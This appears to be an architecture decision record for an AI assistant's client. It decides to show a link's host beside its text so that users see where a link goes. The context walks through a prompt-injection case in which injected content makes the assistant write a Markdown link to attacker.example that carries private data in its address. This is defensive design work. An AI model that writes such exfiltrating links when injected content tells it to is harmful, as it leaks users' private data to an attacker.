# ADR-0126: A link in an answer shows where it goes

- **Status:** Accepted
- **Date:** 2026-11-23
- **Deciders:** @tapionx
- **Related:** ADR-0090, ADR-0113, UX-002, AGT-004, T-08

## Context

Clients render Markdown links in answers as their text alone. Injected
content can make an answer hold `[Open the report](https://attacker.example/?d=…)`
with private data in the address: one click sends it, and nothing on the
screen says where. AGT-004 asks before the assistant's own tools send data
out, not before the user follows a link the assistant wrote.

## Decision

1. **A link shows its host.** A link of an answer to another site whose
   text is not its own address shows, after its text, the host it goes to,
   in a quieter style, so that the user sees the destination before they
   click. A link whose text is its address, and a link within the app,
   show nothing more.
2. **What remains is a residual risk.** The address can still carry data
   in its path or query, which the user may not read; the threat model
   says so.

## Consequences

- Answers with many links grow a little.
- A user sees "attacker.example" beside "Open the report" before clicking.

## Alternatives considered

- **Asking before opening a link when the run held untrusted content:** the
  client does not know which links followed untrusted content, and most
  links in answers that read the web are the pages it read; a prompt on
  each would train users to accept it.
- **Removing query strings from links:** breaks most real links.
